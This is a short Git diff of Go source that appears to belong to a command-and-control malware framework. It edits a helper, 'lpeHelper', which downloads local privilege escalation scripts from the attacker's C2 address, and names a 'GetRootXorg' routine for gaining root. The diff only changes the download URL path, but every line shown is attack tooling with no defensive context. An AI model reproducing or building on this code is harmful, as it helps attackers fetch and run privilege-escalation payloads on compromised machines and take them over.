@@ -83,7 +83,7 @@ func GetRootXorg(ctx context.Context, cancel context.CancelFunc) (err error) {
 func lpeHelper(method string) string {
 	log.Printf("Downloading lpe script from %s", CCAddress+method)
 	var scriptData []byte
-	scriptData, err := DownloadViaCC(CCAddress+method, "")
+	scriptData, err := DownloadViaCC(CCAddress+"www/"+method, "")
 	if err != nil {
 		return "LPE error: " + err.Error()
 	}
